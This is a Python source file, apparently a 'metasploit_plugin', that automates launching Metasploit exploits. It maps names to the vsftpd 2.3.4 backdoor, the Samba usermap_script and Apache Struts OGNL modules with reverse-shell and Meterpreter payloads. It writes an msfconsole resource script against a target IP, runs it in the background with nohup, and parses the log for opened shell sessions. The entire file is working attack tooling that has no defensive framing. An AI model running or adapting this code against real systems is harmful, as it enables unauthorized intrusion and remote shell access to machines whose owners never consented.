import os
import time
import subprocess
from pathlib import Path

EXPLOIT_LIBRARY = {
    "ftp_vsftpd": {
        "module": "exploit/unix/ftp/vsftpd_234_backdoor",
        "payload": "cmd/unix/interact",
        "default_port": 21
    },
    "samba_usermap": {
        "module": "exploit/linux/samba/usermap_script",
        "payload": "cmd/unix/reverse",
        "default_port": 139
    },
    "apache_struts": {
        "module": "exploit/multi/http/struts2_content_type_ognl",
        "payload": "java/meterpreter/reverse_tcp",
        "default_port": 8080
    }
}

def run_msf_attack(
    target_ip, 
    exploit_name="ftp_vsftpd",
    lhost="10.0.0.100",
    lport="4444",
    log_dir="logs/metasploit"
):
    Path(log_dir).mkdir(parents=True, exist_ok=True)
    timestamp = int(time.time())
    script_path = os.path.join(log_dir, f"attack_{timestamp}.rc")
    log_path = os.path.join(log_dir, f"msf_{timestamp}.log")

    if exploit_name not in EXPLOIT_LIBRARY:
        raise ValueError(f"[metasploit_plugin] Unknown exploit: {exploit_name}")

    module = EXPLOIT_LIBRARY[exploit_name]

    with open(script_path, "w") as f:
        f.write(f"use {module['module']}\n")
        f.write(f"set RHOST {target_ip}\n")
        f.write(f"set LHOST {lhost}\n")
        f.write(f"set LPORT {lport}\n")
        f.write(f"set PAYLOAD {module['payload']}\n")
        f.write("exploit -j\n")

    subprocess.Popen(
        ["nohup", "msfconsole", "-r", script_path],
        stdout=open(log_path, "w"),
        stderr=subprocess.STDOUT,
        preexec_fn=os.setpgrp
    )

    print(f"[metasploit_plugin] Launched '{exploit_name}' against {target_ip} → {log_path}")
    return {
        "script": script_path,
        "log": log_path,
        "exploit": exploit_name,
        "timestamp": timestamp
    }

def parse_msf_log(log_path):
    """
    Returns a structured summary: session opened, failure, crash, etc.
    """
    outcome = {"session_opened": False, "errors": [], "log_path": log_path}
    try:
        with open(log_path) as f:
            lines = f.readlines()

        for line in lines:
            if "Meterpreter session" in line or "Command shell session" in line:
                outcome["session_opened"] = True
            if "[error]" in line.lower() or "failed" in line.lower():
                outcome["errors"].append(line.strip())

    except Exception as e:
        outcome["errors"].append(f"Log parsing failed: {e}")

    return outcome

